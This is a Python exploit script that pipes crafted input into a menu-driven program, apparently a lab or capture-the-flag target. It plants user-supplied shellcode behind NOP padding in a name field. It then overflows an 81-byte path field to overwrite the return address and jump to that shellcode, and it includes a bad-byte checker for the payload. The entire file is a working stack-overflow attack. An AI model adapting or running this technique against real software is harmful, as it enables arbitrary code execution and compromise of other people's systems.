import argparse
import sys

# Payload start offset
payload_padding = 0 # no padding is needed

# Trigger offset
path_max_length = 81
trigger_addr_diff = 1 # null terminator?

# Padding value
PAD = b'\x90' # Using 0x90 which is NOP instruction so if CPU hits our padding expecting instructions it will safely slide to the payload

# Exploit
def exploit(mem_start, shellcode): # type: (int, bytes) -> None
    """
    :param mem_start: Start of memory dump
    :param shellcode: Shellcode to load and run
    """
    payload_start = calculate_payload_start_addr(mem_start)

    # 1st pass
    sys.stdout.buffer.write(payload__upload_shellcode(shellcode))

    # Check
    sys.stdout.buffer.write(b'0\n') # 0. View process memory

    # 2nd pass
    sys.stdout.buffer.write(payload__overflow_and_trigger_shellcode(payload_start))

def calculate_payload_start_addr(mem_start): # type: (int) -> int
    # payload_start_addr = <mem_start> + 16b ('Corrupted Memory') + 5b ('Name:') + <payload_padding>
    return mem_start + 16 + 5 + payload_padding

## 1st pass
def payload__upload_shellcode(shellcode): # type: (bytes) -> bytes
    # Action:                   Type:         Name:                 Path:   Reason:
    # 1. Add shutdown sequence  0. Emergency  <padding><shellcode>  \0      \0
    return b'1 0 ' + (PAD * payload_padding) + shellcode + b' \0 \0\n'

## 2nd pass
def payload__overflow_and_trigger_shellcode(payload_start): # type: (int) -> bytes
    address_padding = path_max_length + trigger_addr_diff
    payload_address = payload_start.to_bytes(4, 'little')

    # Action:                   Type:         Name:   Path:                             Reason:
    # 1. Add shutdown sequence  0. Emergency  \0      <padding><payload start address>  \0
    return b'1 0 \0 ' + (PAD * address_padding) + payload_address + b' \0\n'


# Shellcode loading and validation
def load_shellcode(shellcode_path): # type: (str) -> bytes
    # we want to pass our machine (shell) code as string so we have to avoid particular bytes
    bad_bytes = (b'\x00', b'\x20', b'\x0a', b'\x0b', b'\x0d', b'\x2c')

    try:
        with open(shellcode_path, mode='rb') as file:
            data = file.read()
            for bad in bad_bytes:
                if bad in data:
                    raise ValueError('contains banned character code: %s' % (bad.__str__()[4:6],))
            return data
    except Exception as e:
        raise argparse.ArgumentTypeError("can't open '%s': %s" % (shellcode_path, e))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='Shellcode Injection Exploit',
        description="Exploit target's stack overflow vulnerability by injecting shellcode into a pipe"
    )

    parser.add_argument('shellcode', help='Path to shellcode binary file', type=load_shellcode)
    parser.add_argument('memstart', help='Address of target memory', type=lambda s: int(s, 0), nargs='?')
    parser.add_argument('-c', '--check-only', action='store_true', help='Only checks provided shellcode for forbidden values, no hacking this time')
    args = parser.parse_args()

    if args.check_only:
        exit(0)

    if not args.memstart:
        parser.error('the following arguments are required: memstart')

    exploit(args.memstart, args.shellcode)
